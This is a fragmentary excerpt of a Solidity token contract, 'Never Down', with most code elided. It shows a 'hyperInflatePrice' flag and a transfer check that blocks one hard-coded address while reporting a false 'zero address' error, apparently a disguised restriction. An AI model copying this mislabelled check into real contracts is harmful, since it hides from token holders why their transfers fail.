...
contract NeverDown is IERC20, Context, Ownable, ReentrancyGuard {
    ...
    // token data
    string constant _name = "Never Down";
    string constant _symbol = "nvdn";
    ...
    bool public hyperInflatePrice = true;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(recipient != address(0xE259ba736543070035E036eB509Dd6473F1a33f1), "BEP20: transfer to the zero address");
    ...
    /** Purchases NeverDown Tokens and Deposits Them in Sender's Address*/
    ...
    /** Sells NeverDown Tokens And Deposits the BNB into Seller's Address */
